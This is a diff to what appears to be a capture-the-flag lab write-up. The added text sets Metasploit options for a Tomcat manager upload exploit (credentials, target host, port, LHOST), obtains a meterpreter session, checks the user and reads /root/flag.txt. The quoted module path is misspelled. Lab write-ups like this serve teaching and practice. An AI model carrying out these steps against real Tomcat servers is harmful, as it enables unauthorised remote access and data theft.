@@ -161,5 +161,20 @@ and
 
 `exploit/mult/http/tomcate_mgr_upload`
 
+In this case I tried the latter. I took a look at the options that this module needs by running `show options`. I needed to change a few options for I ran the following commands:
+
+```bash
+set httppassword xxxxxxx
+set httpusername xxx
+set rhosts target.thm
+set rport 1234
+set lhost my_attack_box_ip_address
+```
+
+Once I had those options set I ran the `run` command. My prompt changed to `meterpreter > ` to indicate that I was on the machine. From here I ran the `getuid` command to find out who I was running as so I could answer the question.
 
 ## What flag is found in the root directory?
+
+I ran the following command to get the flag:
+
+`cat /root/flag.txt`
